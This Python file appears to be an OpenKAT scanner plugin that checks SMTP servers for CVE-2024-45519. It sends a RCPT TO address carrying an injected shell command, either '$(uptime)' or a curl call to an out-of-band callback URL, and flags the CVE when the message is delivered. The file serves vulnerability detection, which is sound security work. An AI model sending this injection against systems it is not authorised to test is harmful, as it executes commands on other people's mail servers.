# Based on https://github.com/p33d/CVE-2024-45519
import socket
from os import getenv

from boefjes.job_models import BoefjeMeta


def smtp_payload_check_vulnerability(host, port, oast=False):
    with socket.create_connection((host, port), timeout=10) as conn:
        conn.send(b"EHLO localhost\r\n")
        conn.recv(1024)

        conn.send(b"MAIL FROM: <aaaa@test.openkat.nl>\r\n")
        conn.recv(1024)

        # do we have a callback server (out of band security testing) or do we just execute `uptime`
        if oast:
            rcpt_to_payload = f'RCPT TO: <"aabbb$(curl${{IFS}}{oast})"@test.openkat.nl>\r\n'.encode()
        else:
            rcpt_to_payload = b'RCPT TO: <"aabbb$(uptime)"@test.openkat.nl>\r\n'
        conn.send(rcpt_to_payload)
        conn.recv(1024)

        conn.send(b"DATA\r\n")
        conn.recv(1024)

        conn.send(b"aaa\r\n.\r\n")
        resp = conn.recv(1024)

        conn.send(b"QUIT\r\n")
        return resp.decode("utf-8")


def run(boefje_meta: BoefjeMeta) -> list[tuple[set, str | bytes]]:
    input_ = boefje_meta.arguments["input"]  # input is IPService
    ip_port = input_["ip_port"]
    if input_["service"]["name"] != "smtp":
        return [({"info/boefje"}, "Skipping because service is not an smtp service")]
    ip = ip_port["address"]["address"]
    port = ip_port["port"]
    oast = getenv("OAST_URL", False)

    response = smtp_payload_check_vulnerability(ip, port, oast)

    if "message delivered" in response:
        return [(set(), response), ({"openkat/finding"}, "CVE-2024-45519")]
    else:
        return []
